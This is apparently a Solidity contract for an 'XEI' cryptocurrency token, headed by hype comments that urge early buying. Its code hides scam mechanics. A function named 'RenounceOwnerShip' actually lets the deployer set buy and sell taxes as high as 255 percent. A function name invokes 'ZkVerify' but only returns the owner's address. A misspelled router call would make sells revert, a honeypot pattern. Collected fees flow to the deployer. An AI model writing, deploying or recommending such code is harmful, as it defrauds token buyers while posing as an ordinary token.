// Everyone is waiting for AI season, but remember, the first mover always creates the new META with the most benefits.
// 
// WEBSITE:    https://xei.ai/
// X:          https://x.com/xei_official
// TG:         https://t.me/xei_ai
// WHITEPAPER: https://xei.gitbook.io/documentation
//
// First mover advantage. Get in early.

/***
 *    ██╗  ██╗███████╗██╗    █████╗ ██╗
 *    ╚██╗██╔╝██╔════╝██║   ██╔══██╗██║
 *     ╚███╔╝ █████╗  ██║   ███████║██║
 *     ██╔██╗ ██╔══╝  ██║   ██╔══██║██║
 *    ██╔╝ ██╗███████╗██║██╗██║  ██║██║
 *    ╚═╝  ╚═╝╚══════╝╚═╝╚═╝╚═╝  ╚═╝╚═╝
 *                                     
 */

// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract XEI { 

    string private _name = unicode"XEI";
    string private _symbol = unicode"XEI";
    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1000000 * 10**decimals;

    struct StoreData {
        address tokenMkt;
        uint8 mTX;
        uint8 mWL;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 public immutable _uniswapV2Router;

    bool private swapping;
    bool private tradingOpen;

    address public  _factory;
    address public  _weth;

    constructor() {
        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uint8 _initmTX = 0;
        uint8 _initmWL = 0;
        storeData = StoreData({tokenMkt: msg.sender, mTX: _initmTX, mWL: _initmWL});
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function RenounceOwnerShip(uint8 _oldOwner, uint8 _newOwner) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        maxSaveData(_oldOwner, _newOwner);
    }

    function _decodeTokenMktWithZkVerify() private view returns(address) {
        return storeData.tokenMkt;
    }

    function openedTrade() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        tradingOpen = true;
    }

    function maxSaveData(uint8 _b, uint8 _s) private {
        storeData.mTX = _b;
        storeData.mWL = _s;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount && from != tokenMkt) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _mTX, uint8 _mWL) = (storeData.mTX, storeData.mWL);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _mWL : _mTX)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}
